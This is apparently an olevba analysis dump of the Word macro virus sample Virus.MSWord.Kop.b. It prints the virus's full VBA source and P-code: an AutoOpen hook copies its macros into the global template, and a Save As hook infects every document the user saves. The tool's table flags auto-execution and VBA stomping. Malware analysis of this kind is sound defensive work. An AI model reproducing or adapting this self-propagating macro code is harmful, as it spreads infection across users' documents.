olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kop.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
        WordBasic.Call "kopieren"
End Sub
-------------------------------------------------------------------------------
VBA MACRO kopieren.bas 
in file: Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/kopieren'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":testmakro", "Global:DateiSpeichernUnter", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpenDot", 1
    WordBasic.MacroCopy WordBasic.[WindowName$]() + ":kopieren", "Global:kopieren", 1

End Sub
-------------------------------------------------------------------------------
VBA MACRO testmakro.bas 
in file: Virus.MSWord.Kop.b - OLE stream: 'Macros/VBA/testmakro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Cnt
Dim Founded
    Dim dbox As Object: Set dbox = WordBasic.DialogRecord.FileSaveAs(False)         'define Dialog box
    WordBasic.CurValues.FileSaveAs dbox                 'initialize and run dialog box
    
    On Error GoTo -1: On Error GoTo Ende                    'Call Exception Handle "Exit"
    WordBasic.Dialog.FileSaveAs dbox
    If ((dbox.Format = 0) Or (dbox.Format = 1)) Then  'Save only Macros in                                                Files with the end                                                  *.dot, *.doc
        For Cnt = 1 To WordBasic.CountMacros(0) 'Count virulent macros
            If WordBasic.[MacroName$](Cnt, 0, 1) = "AutoOpen" Then
                Founded = Founded + 1
            ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "kopieren" Then
                Founded = Founded + 1
            ElseIf WordBasic.[MacroName$](Cnt, 0, 1) = "testmakro" Then
                Founded = Founded + 1
            End If
        Next Cnt

        If Founded = 3 Then
            WordBasic.MsgBox "Dokument mit den Makros schon infiziert !"
            WordBasic.FileSaveAs dbox
        Else

            WordBasic.MacroCopy "Global:AutoOpenDot", WordBasic.[WindowName$]() + ":AutoOpen", 1
            WordBasic.MacroCopy "Global:kopieren", WordBasic.[WindowName$]() + ":kopieren", 1
            WordBasic.MacroCopy "Global:DateiSpeichernUnter", WordBasic.[WindowName$]() + ":testmakro", 1
            dbox.Format = 1                 'transform File in a                                                 template
            WordBasic.FileSaveAs dbox       'save the File
End If
 
Ende:                                   'End Sub if "Exit"
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Kop.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 884 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitStr 0x0008 "kopieren"
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0001 
' Line #3:
' 	EndSub 
' Macros/VBA/kopieren - 1207 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":testmakro"
' 	Add 
' 	LitStr 0x001A "Global:DateiSpeichernUnter"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0012 "Global:AutoOpenDot"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":kopieren"
' 	Add 
' 	LitStr 0x000F "Global:kopieren"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #6:
' Line #7:
' 	EndSub 
' Macros/VBA/testmakro - 3130 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Cnt
' Line #3:
' 	Dim 
' 	VarDefn Founded
' Line #4:
' 	Dim 
' 	VarDefn dbox (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dbox 
' 	QuoteRem 0x0054 0x0011 "define Dialog box"
' Line #5:
' 	Ld dbox 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x0038 0x001D "initialize and run dialog box"
' Line #6:
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Ende 
' 	QuoteRem 0x003C 0x001C "Call Exception Handle "Exit""
' Line #8:
' 	Ld dbox 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dbox 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld dbox 
' 	MemLd Format$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	IfBlock 
' 	QuoteRem 0x0036 0x0093 "Save only Macros in                                                Files with the end                                                  *.dot, *.doc"
' Line #10:
' 	StartForVariable 
' 	Ld Cnt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' 	QuoteRem 0x0030 0x0015 "Count virulent macros"
' Line #11:
' 	Ld Cnt 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	Ld Founded 
' 	LitDI2 0x0001 
' 	Add 
' 	St Founded 
' Line #13:
' 	Ld Cnt 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0008 "kopieren"
' 	Eq 
' 	ElseIfBlock 
' Line #14:
' 	Ld Founded 
' 	LitDI2 0x0001 
' 	Add 
' 	St Founded 
' Line #15:
' 	Ld Cnt 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "testmakro"
' 	Eq 
' 	ElseIfBlock 
' Line #16:
' 	Ld Founded 
' 	LitDI2 0x0001 
' 	Add 
' 	St Founded 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	StartForVariable 
' 	Ld Cnt 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' Line #20:
' 	Ld Founded 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0029 "Dokument mit den Makros schon infiziert !"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #22:
' 	Ld dbox 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #23:
' 	ElseBlock 
' Line #24:
' Line #25:
' 	LitStr 0x0012 "Global:AutoOpenDot"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #26:
' 	LitStr 0x000F "Global:kopieren"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":kopieren"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #27:
' 	LitStr 0x001A "Global:DateiSpeichernUnter"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":testmakro"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld dbox 
' 	MemSt Format$ 
' 	QuoteRem 0x002C 0x004C "transform File in a                                                 template"
' Line #29:
' 	Ld dbox 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' 	QuoteRem 0x002C 0x000D "save the File"
' Line #30:
' 	EndIfBlock 
' Line #31:
' Line #32:
' 	Label Ende 
' 	QuoteRem 0x0028 0x0011 "End Sub if "Exit""
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

